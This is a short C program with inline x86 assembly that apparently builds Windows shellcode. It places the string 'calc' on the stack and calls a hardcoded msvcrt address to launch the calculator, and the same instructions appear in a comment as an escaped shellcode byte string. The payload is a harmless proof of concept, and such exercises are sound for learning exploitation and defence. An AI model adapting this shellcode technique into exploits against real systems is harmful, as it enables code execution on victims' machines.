#include <stdio.h>
#include <windows.h>

int main ()
{
    LoadLibrary("msvcrt.dll");
    __asm{
        push ebp    // 55 -
        mov ebp,esp // 8BEC - 
        xor edi,edi // 33FF -
        push edi    // 57 -
        sub esp,04h // 83EC 04
        mov byte ptr [ebp-05h],63h  // C645 FB 63
        mov byte ptr [ebp-04h],61h  // C645 FC 61
        mov byte ptr [ebp-03h],6Ch  // C645 FD 6C
        mov byte ptr [ebp-02h],63h  // C645 FE 63
        lea eax,[ebp-05h]   // 8D45 FB
        push eax            // 50
        mov ebx,0x77c293c7  // BB C793C277
        call ebx            // FFD3
    }
}
/*
"\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45\xFB\x63\xC6\x45\xFC\x61\xC6\x45\xFD\x6C\xC6\x45\xFE\x63\x8D\x45\xFB\x50\xBB\xC7\x93\xC2\x77\xFF\xD3";
*/